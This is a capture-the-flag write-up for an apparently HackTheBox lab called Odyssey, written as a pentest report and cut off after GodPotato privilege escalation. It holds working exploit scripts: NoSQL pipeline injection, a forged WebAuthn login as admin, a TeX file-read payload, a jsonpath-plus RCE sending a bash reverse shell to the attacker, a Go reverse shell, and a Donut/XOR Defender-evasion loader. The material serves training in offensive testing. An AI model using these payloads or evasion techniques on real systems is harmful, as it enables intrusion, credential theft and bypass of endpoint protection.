# Odyssey - Multi-Host Kill-Chain: From NoSQL Injection to Active Directory Domain Takeover

**Platform:** HackTheBox | **Target OS:** Linux (Web) → Windows (DB) → Windows Server 2025 (DC) | **Difficulty:** Insane
**Focus:** MongoDB Aggregation Pipeline Injection, WebAuthn FIDO2 Ceremony Bypass, Prototype Pollution (Nunjucks/Pandoc), LaTeX Blind File Read, CVE-2025-1302 (jsonpath-plus RCE), MSSQL UNC Hash Coercion, GodPotato (SeImpersonatePrivilege), Defender Evasion (Go + Donut + XOR), AD Shadow Credentials, BadSuccessor dMSA Abuse, DPAPI Decryption Oracle, YAML Insecure Deserialization, DCSync

## 1. Executive Summary & Attack Chain
This engagement assessed a multi-tiered enterprise environment comprising three interconnected hosts — a Linux-based Node.js web application server (`odyssey-web`), an internal Windows MSSQL database server (`odyssey-db`), and a Windows Server 2025 Active Directory Domain Controller (`dc01.odyssey.htb`). The attack surface initially presented a single externally accessible service: a FIDO2/WebAuthn-protected portal running on Node.js Express. Through a cascading chain of nine distinct vulnerability classes spanning web, OS, cryptographic, and Active Directory layers, full domain compromise was achieved.

The business risk is critical. An attacker with nothing more than network reachability to the web application's single TCP port was able to traverse the entire environment, compromise every host, exfiltrate all domain credentials, and achieve unrestricted administrative control over the Active Directory forest. The attack chain demonstrates a failure of defense-in-depth, where each layer's misconfiguration or vulnerability directly enabled progression to the next.

**Kill-Chain Summary:**
1. **Reconnaissance:** Nmap identified a single Node.js Express service on port 3000 with a FIDO2/WebAuthn login portal. Directory fuzzing uncovered an `/onboard` enrollment endpoint and a metadata search API (`/api/v1/aegis-mds/search`).
2. **Initial Access (Web — `odyssey-web`):** A MongoDB Aggregation Pipeline Injection via the `pipeline` parameter was exploited using `$facet`/`$lookup` to exfiltrate invitation tokens from the `pending_invites` collection. A WebAuthn registration ceremony was forged with `attestation: "none"` to bind a synthetic credential, and a `userHandle` confusion attack escalated the session to `Administrator`. Prototype Pollution in Nunjucks merge filters enabled raw LaTeX injection via Pandoc, achieving blind arbitrary file read through TeX `\openin`/`\read`/`\message` primitives. Source code exfiltration revealed a vulnerable diagnostic endpoint using `jsonpath-plus` with `eval: 'safe'` and `preventEval: false`, which was exploited via CVE-2025-1302 for full RCE as `webadmin`.
3. **Lateral Movement (Internal — `odyssey-db`):** Internal network enumeration via `ligolo-ng` tunneling revealed MSSQL (1433) and WinRM (5985) on `172.16.0.11`. Hardcoded SQL credentials and a second credential set from `/etc/aegis-render.env` provided database access. The `bulkadmin` role was leveraged for UNC path coercion via `BULK INSERT`, capturing the `svc-mssql` NTLMv2 hash and cracking it offline. Re-authentication as `svc-mssql` (sysadmin) enabled `xp_cmdshell`. Windows Defender was bypassed using a three-stage loader: Go reverse shell → Donut shellcode conversion → XOR-encrypted in-memory execution with RW→RX `VirtualProtect` flip. GodPotato exploited `SeImpersonatePrivilege` to achieve `NT AUTHORITY\SYSTEM` on `odyssey-db`.
4. **Active Directory Takeover (DC — `dc01.odyssey.htb`):** Machine account hash extraction via `secretsdump.py` → BloodHound path discovery (`ODYSSEY-DB$` → Build Hosts → Pipeline Trustees → Attest Key Managers → `AddKeyCredentialLink` on `svc-aegis-build`) → Shadow Credentials attack via `certipy` → BadSuccessor dMSA exploitation via `bloodyAD` to impersonate `svc-aegis-deploy` → WinRM access to DC → Registry enumeration of `AegisStreamCollector` service → Binary analysis of .NET 8 Named Pipe IPC protocol → DPAPI Decryption Oracle abuse to recover Operator KEK → AES-GCM decryption of Operator HMAC key → YAML Insecure Deserialization (`ObjectDataProvider` gadget) for code execution as `svc-aegis-stream` → Rubeus TGT delegation → DCSync extraction of Domain Administrator NTLM hash → Pass-The-Hash for full domain compromise.

---

## 2. Network Reconnaissance & Attack Surface Mapping
The assessment commenced with a standard Nmap service and script scan against the target host.

```bash
❯ nmap -sV -sC -Pn -T4 10.129.121.86
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 08:04 +0300
Nmap scan report for 10.129.121.86
Host is up (0.14s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds
```

**Technical Analysis:**
The target exposed a single service — a Node.js Express application on port 3000. The HTTP title redirect to `aegis.korvia.htb` indicated virtual host routing, necessitating a `/etc/hosts` entry. The minimal attack surface (single port, no SSH, no standard web server) suggested a hardened deployment where the web application itself would be the primary entry vector.

### Web Directory Fuzzing
Gobuster enumeration mapped the application's route structure:

```bash
❯ gobuster dir -u http://aegis.korvia.htb:3000/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://aegis.korvia.htb:3000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
img                  (Status: 301) [Size: 153] [--> /img/]
login                (Status: 200) [Size: 4378]
account              (Status: 302) [Size: 28] [--> /login]
css                  (Status: 301) [Size: 153] [--> /css/]
status               (Status: 302) [Size: 28] [--> /login]
Login                (Status: 200) [Size: 4378]
js                   (Status: 301) [Size: 152] [--> /js/]
logout               (Status: 302) [Size: 28] [--> /login]
dashboard            (Status: 302) [Size: 28] [--> /login]
Account              (Status: 302) [Size: 28] [--> /login]
requests             (Status: 302) [Size: 28] [--> /login]
Logout               (Status: 302) [Size: 28] [--> /login]
Status               (Status: 302) [Size: 28] [--> /login]
Dashboard            (Status: 302) [Size: 28] [--> /login]
STATUS               (Status: 302) [Size: 28] [--> /login]
onboard              (Status: 400) [Size: 2543]
```

All authenticated routes redirected to `/login`. The `/onboard` endpoint returned a `400 Bad Request` rather than `302` or `404`, suggesting it expected specific input — a token-based enrollment flow.

---

## 3. Initial Access: MongoDB NoSQL Injection & WebAuthn Ceremony Forgery

### 3.1 API Discovery & NoSQL Injection

The login page implemented FIDO2/WebAuthn hardware-key authentication exclusively. Intercepting the authentication flow in Burp Suite revealed the API endpoint `/api/v1/auth/webauthn/auth/begin`, and critically, a metadata search API:

```http
GET /api/v1/aegis-mds/search?q=&limit=8 HTTP/1.1
Host: aegis.korvia.htb:3000
Accept: */*
Referer: http://aegis.korvia.htb:3000/login
```

This endpoint returned FIDO authenticator metadata (AAGUIDs, vendor names, certification levels) from what appeared to be a MongoDB backend. Testing for NoSQL injection with operator-form queries yielded a revealing error:

```text
{"error":"InvalidQueryShape","detail":"Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.","trace_id":"mds-bb41ec"}
```

### Theoretical Vulnerability Mechanics: MongoDB Aggregation Pipeline Injection

MongoDB's Aggregation Framework provides a powerful data processing pipeline that operates through sequential stages (`$match`, `$lookup`, `$group`, etc.). When an application exposes a `pipeline` parameter and passes user-controlled JSON arrays directly to `db.collection.aggregate()`, an attacker can inject arbitrary aggregation stages.

The critical stage for cross-collection data exfiltration is `$lookup`, which performs a server-side left outer join against any collection in the same database. However, the application had implemented a server-side stage blocklist that rejected `$lookup` at the top level. This was bypassed using `$facet` — a stage that accepts sub-pipelines as values. Because the blocklist only validated top-level stages, embedding `$lookup` within a `$facet` sub-pipeline circumvented the restriction entirely. This is a classic defense-in-depth failure: the security boundary was enforced at the wrong layer of the pipeline processing chain.

The injection payload chained `$facet` → `$lookup` → `$unwind` → `$replaceRoot` to pivot from the `aegis_mds` collection into the `pending_invites` collection:

```text
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites","pipeline":[],"as":"y"}},{"$unwind":"$y"},{"$replaceRoot":{"newRoot":"$y"}}]}}]
```

The response contained a full dump of invitation tokens with associated metadata:

```json
[{"x":[{"_id":"69f49023225fb3c680909274","operator_id":"op-2026-0042","role":"Operator","token":"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238","issued_by":"ao-mreyes","issued_at":"2026-04-15T08:00:00.000Z","expires_at":"2126-05-15T00:00:00.000Z","redeemed":false,"pipeline":"forge-recruitment","clearance_target":"Δ-3"},{"_id":"69f49023225fb3c680909275","operator_id":"op-2026-0051","role":"Operator","token":"d6fe33f9f9402c666fe166f2be911cb6b98d054c5be5a9921312ae1d51c72fdc",...}]}]
```

The first token (`dad657...`) had an expiration date of `2126-05-15`, making it effectively permanent.

### 3.2 WebAuthn Registration Forgery

Navigating to `/onboard/dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238` initiated the FIDO2 registration ceremony, but the browser rejected it:

```text
FIDO2 / WebAuthn ceremony · attestation will bind your hardware authenticator to operator op-2026-0042.
Registration failed: Not allowed outside localhost (operation rejected by platform).
```

### Theoretical Vulnerability Mechanics: WebAuthn Attestation & userHandle Confusion

The WebAuthn registration response from the server contained a critical misconfiguration:

```json
{"challenge":"LKsNwlpCBT0hwmCS2t44vbKuH5P0Z70Y63COsxcmQlA","rp":{"name":"AEGIS — Sovereign Signing & Attestation Authority","id":"aegis.korvia.htb"},"user":{"id":"b3AtMjAyNi0wMDQy","name":"op-2026-0042","displayName":"op-2026-0042"},"pubKeyCredParams":[{"alg":-7,"type":"public-key"},{"alg":-257,"type":"public-key"}],"timeout":60000,"attestation":"none","excludeCredentials":[],"authenticatorSelection":{"residentKey":"required","userVerification":"preferred","requireResidentKey":true},"extensions":{"credProps":true}}
```

The `"attestation":"none"` directive is the lynchpin. In the W3C WebAuthn specification, the attestation conveyance preference determines whether the Relying Party (RP) requests cryptographic proof that the authenticator is genuine hardware. When set to `"none"`, the server explicitly waives hardware verification — it will accept any attestation object, including one fabricated entirely in software. The browser is the entity enforcing the `localhost` restriction, not the server. The `/api/v1/auth/webauthn/register/finish` endpoint remains directly accessible.

A Python script was crafted to forge the entire WebAuthn registration ceremony in software — generating an EC P-256 key pair, constructing the authenticator data with zeroed AAGUID (indicating no real hardware), and submitting an attestation object with `fmt: "none"`:

```python
# webauthn_register.py
#!/usr/bin/env python3
import os, json, hashlib, struct, pickle, requests, cbor2
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
TOKEN  = "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238"

s = requests.Session()
r = s.post(f"{BASE}/api/v1/auth/webauthn/register/begin", json={"invite_token": TOKEN})
r.raise_for_status()
opts      = r.json()
challenge = websafe_decode(opts["challenge"])
user_id   = websafe_decode(opts["user"]["id"])
print(f"[+] operator user_id: {user_id.decode()}")

# Generate EC P-256 keypair (alg -7 = ES256, what the server asked for)
priv = ec.generate_private_key(ec.SECP256R1())
pn   = priv.public_key().public_numbers()
i2b  = lambda n: n.to_bytes(32, "big")
cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}

# Build authenticator data
cred_id    = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x41  # UP=1 | AT=1
counter    = struct.pack(">I", 1)
aaguid     = b"\x00" * 16   # zeroes = no real authenticator model
attested   = aaguid + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
auth_data  = rp_id_hash + bytes([flags]) + counter + attested

# attestation object — fmt "none" = no attestation, server won't verify hardware
attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})

client_data = json.dumps({
    "type": "webauthn.create",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "attestationObject": websafe_encode(attestation_obj),
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body)
print(f"[+] register/finish: {r.status_code} {r.text}")
r.raise_for_status()

priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
with open("aegis_cred.pkl", "wb") as f:
    pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, f)
print("[+] credential saved")
```

```text
❯ python3 webauthn_register.py
[+] operator user_id: op-2026-0042
[+] register/finish: 200 {"ok":true,"operator_id":"op-2026-0042","message":"Credential bound. You may now authenticate."}
[+] credential saved
```

The second critical flaw was a **userHandle confusion** vulnerability. The WebAuthn specification states that the `userHandle` in an authentication assertion identifies the user account. This server trusted the client-supplied `userHandle` without verifying it against the credential's registered owner. By setting `userHandle` to `admin` (Base64-encoded) while authenticating with a credential registered to `op-2026-0042`, the server elevated the session to Administrator:

```python
#!/usr/bin/env python3
import json, hashlib, struct, pickle, re, requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"

data     = pickle.load(open("aegis_cred.pkl", "rb"))
priv     = serialization.load_pem_private_key(data["priv_pem"], password=None)
cred_id  = data["cred_id"]
user_id  = data["user_id"]
print(f"[+] loaded credential for {user_id.decode()}")

s = requests.Session()
r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
r.raise_for_status()
challenge = websafe_decode(r.json()["challenge"])

rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x01  # UP only
counter    = struct.pack(">I", 2)
auth_data  = rp_id_hash + bytes([flags]) + counter

client_data = json.dumps({
    "type": "webauthn.get",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

to_sign = auth_data + hashlib.sha256(client_data).digest()
sig     = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "authenticatorData": websafe_encode(auth_data),
        "signature": websafe_encode(sig),
        "userHandle": websafe_encode(b"admin"),   # the confusion — send admin, not our registered operator
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body)
print(f"[+] auth/finish: {r.status_code} {r.text}")
r.raise_for_status()
print(f"[+] cookie: aegis.sid={s.cookies.get('aegis.sid')}")
```

```text
❯ python3 webauthn_login.py
[+] loaded credential for op-2026-0042
[+] auth/finish: 200 {"ok":true,"handle":"admin","display_name":"System Administrator","role":"Administrator","clearance":"Δ-5","redirect":"/dashboard"}
	[+] cookie: aegis.sid=s%3AXOtXmrZGtlxvT7DCVavtv2lTjDVhysnQ.vqcHijs8WMW39sMFX3CQU0x%2F6uBCGMI%2BV87K%2BbUPWBU
```

### 3.3 Prototype Pollution → LaTeX Blind File Read → Source Code Exfiltration

With administrative access, a "Notice Templates" panel was discovered. The template engine used Nunjucks with a `merge` filter applied to user-controlled JSON overrides: `{{ overrides | merge(defaults) | json }}`. Recursive property assignment from user input constitutes a textbook **Prototype Pollution** vector.

The render pipeline was: **Nunjucks → Pandoc → pdflatex → Ghostscript**. The Pandoc invocation used `--from markdown-raw_attribute`, where the `-raw_attribute` suffix disabled raw LaTeX blocks. An `allowRawBlocks: false` property existed in the default overrides. By injecting `"__proto__": { "allowRawBlocks": true }` into the overrides JSON, the Pandoc flag flipped to `+raw_attribute`:

```json
"audience": "internal",
  "__proto__": { "allowRawBlocks": true },
  "ceremony_witness": "s.vrana"
```

Verification — the command changed from:
```json
"cmd":"/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template
```
To:
```json
"cmd":"/usr/bin/pandoc --from markdown+raw_attribute --to latex --standalone --template
```

Shell escape was disabled (`-no-shell-escape`, `-dSAFER`), preventing direct RCE. However, TeX's low-level I/O primitives (`\openin`, `\read`, `\message`) operate below the typesetting engine and write directly to the log stream. The following payload was injected into the template body to achieve blind arbitrary file read:

```latex
`\newread\foo \openin\foo=<TARGET_FILE> \loop\unless\ifeof\foo \read\foo to \line \message{^^J<<<\meaning\line>>>^^J}\repeat \closein\foo`{=latex}
```

Systematic file exfiltration revealed:
- `/proc/self/cgroup` → `aegis.service`
- `/etc/systemd/system/aegis.service` → `ExecStart=/usr/bin/node /home/webadmin/aegis/server.js`
- `server.js` → route `./routes/mds_diag`
- `/home/webadmin/aegis/routes/mds_diag.js` → diagnostic endpoint with `jsonpath-plus` using `eval: 'safe'` and `preventEval: false`

### 3.4 CVE-2025-1302: jsonpath-plus Remote Code Execution

### Theoretical Vulnerability Mechanics: CVE-2025-1302

CVE-2025-1302 is a critical RCE vulnerability in the `jsonpath-plus` npm package (versions prior to 10.3.0). The vulnerability stems from insufficient input sanitization in the `Safe-Script.js` component. When the default unsafe mode `eval='safe'` is active and `preventEval: false` takes precedence, filter expressions `?()` are passed directly to JavaScript's `Function` constructor or `eval()`. An attacker can inject arbitrary JavaScript via the expression syntax, achieving code execution within the Node.js process context.

The diagnostic endpoint required a secret token (`bcdf42b953dcee715b8d81e38f0c5ded`), which was extracted via the LaTeX file read. The exploit script:

```python
# cve_2025_1302.py
import requests, base64

DIAG_TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL        = f"http://aegis.korvia.htb:3000/api/v1/aegis-mds/_diag/{DIAG_TOKEN}/jpquery"
LHOST      = "10.10.16.29"
LPORT      = 4444

cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

inner = (
    f"this.process.mainModule.require('child_process')"
    f".exec('echo {b64}|base64 -d|bash')"
)
expr = (
    f"$..[?(p=\"{inner}\";"
    f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
)

requests.post(URL, json={"context": "registration", "expr": expr}, timeout=5)
```

```bash
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.121.86 49976
bash: cannot set terminal process group (1479): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@odyssey-web:~/aegis$ whoami
whoami
webadmin
webadmin@odyssey-web:~/aegis$ id
id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),983(aegis-render)
```

---

## 4. Lateral Movement: Internal Network Pivoting & MSSQL Exploitation

### 4.1 Internal Network Discovery & Tunneling

Local enumeration of the web server revealed hardcoded MSSQL credentials in `/home/webadmin/aegis/db/sql.js`:

```javascript
const config = {
  user: process.env.AEGIS_SQL_USER || 'odyssey_app',
  password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
  server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
  database: process.env.AEGIS_SQL_DB || 'aegis',
  port: parseInt(process.env.AEGIS_SQL_PORT || '1433', 10),
  ...
  options: {
    encrypt: false,
    trustServerCertificate: true,
    ...
  },
};
```

The `/etc/hosts` file revealed the internal topology:

```text
172.16.0.10 dc01.odyssey.htb dc01
172.16.0.11 odyssey-db.odyssey.htb odyssey-db
```

SSH was discovered to be running behind a `ufw` firewall. The firewall was disabled, but SSH connectivity remained unresponsive. Network tunneling was established using `ligolo-ng`:

```text
ligolo-ng -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] daemon configuration file not found. Creating a new one...
? Enable Ligolo-ng WebUI? Yes
? Allow CORS Access from https://webui.ligolo.ng? Yes
WARN[0012] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials!
WARN[0012] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
ERRO[0012] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate
INFO[0012] Listening on 0.0.0.0:11601
...
ligolo-ng » INFO[0027] Agent joined.                                 id=00155d014205 name=root@odyssey-web remote="10.129.121.86:49960"
ligolo-ng » session
? Specify a session : 1 - root@odyssey-web - 10.129.121.86:49960 - 00155d014205
[Agent : root@odyssey-web] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth0                           │
│ Hardware MAC │ 00:15:5d:01:42:05              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.0.12/24                 │
│ IPv6 Address │ fe80::215:5dff:fe01:4205/64    │
└──────────────┴────────────────────────────────┘
[Agent : root@odyssey-web] » start
INFO[0286] Starting tunnel to root@odyssey-web (00155d014205)
```

Note the operational errors during ligolo agent deployment — multiple connection attempts before success:

```text
root@odyssey-web:/home/webadmin/aegis# ./agent ./agent -connect 10.10.16.29:11601 -ignore-cert
FATA[0000] please, specify the target host user -connect host:port
root@odyssey-web:/home/webadmin/aegis# ./agent -connect 0xZiki/10.10.16.29:11601 -ignore-cert
ERRO[0000] Connection error: dial tcp: lookup 0xZiki/10.10.16.29: no such host
root@odyssey-web:/home/webadmin/aegis# ./agent -connect 10.10.16.29:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.16.29:11601"
```

### 4.2 MSSQL Enumeration & NTLMv2 Hash Coercion

Nmap scanning of the internal network confirmed MSSQL and WinRM on `odyssey-db`:

```bash
❯ nmap -sV -sC -Pn -T4 odyssey-db.odyssey.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 12:17 +0300
Nmap scan report for odyssey-db.odyssey.htb (172.16.0.11)
Host is up (0.26s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   172.16.0.11:1433:
|     Target_Name: ODYSSEY
|     NetBIOS_Domain_Name: ODYSSEY
|     NetBIOS_Computer_Name: ODYSSEY-DB
|     DNS_Domain_Name: odyssey.htb
|     DNS_Computer_Name: odyssey-db.odyssey.htb
|     DNS_Tree_Name: odyssey.htb
|_    Product_Version: 10.0.26100
| ms-sql-info:
|   172.16.0.11:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

A second set of MSSQL credentials was discovered in `/etc/aegis-render.env`:

```text
AEGIS_RENDER_DB_USER=aegis_audit_publisher
AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
AEGIS_RENDER_DB_HOST=172.16.0.11
AEGIS_RENDER_DB_DB=aegis_audit
AEGIS_RENDER_DB_PORT=1433
```

### Theoretical Vulnerability Mechanics: BULK INSERT UNC Path Coercion

The `aegis_audit_publisher` account held the `bulkadmin` server role. `BULK INSERT` accepts a UNC path (`\\attacker\share\file`) as the data source. When the MSSQL service processes this, it initiates an outbound SMB connection to the specified host, automatically transmitting the service account's NTLMv2 Challenge-Response hash. On Windows Server 2025, NTLM relay is disabled by default, but offline hash capture and cracking remain viable.

```text
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin
is_sysadmin
-----------
          0
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> ELECT IS_SRVROLEMEMBER('bulkadmin') AS is_bulkadmin
ERROR(odyssey-db): Line 1: Incorrect syntax near 'bulkadmin'.
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> SELECT IS_SRVROLEMEMBER('bulkadmin') AS is_bulkadmin
is_bulkadmin
------------
           1
```

Responder captured the `svc-mssql` NTLMv2 hash:

```text
[SMB] NTLMv2-SSP Client   : 10.10.16.29
[SMB] NTLMv2-SSP Username : ODYSSEY\svc-mssql
[SMB] NTLMv2-SSP Hash     : svc-mssql::ODYSSEY:26c6da8722bb0c3e:72A7B35818376A293A18C2F04D9F82E7:0101000000000000809FF0A0FE48DD01B421611085585CE9000000000200080059005A004600530001001E00570049004E002D004A00520057004600550044005900460049003300510004003400570049004E002D004A0052005700460055004400590046004900330051002E0059005A00460053002E004C004F00430041004C000300140059005A00460053002E004C004F00430041004C000500140059005A00460053002E004C004F00430041004C0007000800809FF0A0FE48DD01060004000200000008005000500000000000000000000000003000001BD81326FD83403C4DACAAF26EF87FA75289FF6FD8AF95202DAD9C2D24B77E4438322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0030002E00310032000000000000000000
```

Hashcat cracked it: `cml958782`.

### 4.3 xp_cmdshell & Defender Evasion via Go/Donut/XOR Loader

Re-authenticating as `svc-mssql` with Windows authentication confirmed sysadmin privileges and `SeImpersonatePrivilege`:

```text
❯ mssqlclient.py 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
...
SQL (ODYSSEY\svc-mssql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')

-
1
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(odyssey-db): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(odyssey-db): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
NULL
```

### Theoretical Vulnerability Mechanics: Three-Stage Defender Evasion Pipeline

Direct execution of offensive tooling was blocked by Windows Defender. The evasion strategy employed a three-stage pipeline:

**Stage 1 — Go Native Reverse Shell:** Go compiles to a native PE binary without .NET CLR or PowerShell engine dependencies. The Antimalware Scan Interface (AMSI) hooks deeply into .NET and PowerShell runtimes; a Go binary sidesteps these integration points entirely.

```go
// gorevshell.go
package main
import ("bufio"; "net"; "os/exec"; "strings")
func main() {
    conn, err := net.Dial("tcp", "172.16.0.12:4444")
    if err != nil { return }
    defer conn.Close()
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
        out, _ := cmd.CombinedOutput()
        conn.Write(out)
        conn.Write([]byte("PS C:\\> "))
    }
}
```

**Stage 2 — Donut Shellcode Conversion:** The `donut` framework converts any PE (in this case, `GodPotato.exe`) into position-independent shellcode (PIC). The output is raw x86-64 shellcode stripped of PE headers, import tables, and section structures, neutralizing most static detection signatures.

**Stage 3 — XOR-Encrypted In-Memory Loader:** The shellcode is XOR-encrypted with a 32-byte random key. The Go loader allocates memory as `PAGE_READWRITE` (0x04), writes the decrypted shellcode, then flips permissions to `PAGE_EXECUTE_READ` (0x20) via `VirtualProtect`. The RW→RX transition avoids the `PAGE_EXECUTE_READWRITE` (0x40) behavioral heuristic that triggers Defender alerts. A new thread is spawned to execute the shellcode.

```python
import donut, secrets

shellcode  = donut.create(file="GodPotato.exe", params=r'-cmd C:\Users\Public\s.exe')
key        = secrets.token_bytes(32)
encrypted  = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])
# ... generates loader.go with embedded encrypted shellcode and key ...
```

```bash
❯ python3 loader.py
[+] generated loader.go (88555 bytes shellcode)

 󰄬 ❯ GOOS=windows GOARCH=amd64 go build -o p.exe -ldflags "-s -w" loader.go
```

Execution via `xp_cmdshell` successfully invoked GodPotato, which exploited `SeImpersonatePrivilege` by creating a named pipe, triggering an RPCSS connection, and impersonating `NT AUTHORITY\SYSTEM`:

```text
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'C:/Users/Public/p.exe';
output
--------------------------------------------------------------------------------------
[*] CombaseModule: 0x140704431603712
[*] DispatchTable: 0x140704434337512
[*] UseProtseqFunction: 0x140704433309504
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d45321b7-131b-4ecb-bb1a-7eec81ca8268\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000ac02-0f08-ffff-8798-91f3eab74b07
[*] DCOM obj OXID: 0x5aefcac28d6b7535
[*] DCOM obj OID: 0x4b61c4c277c446eb
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
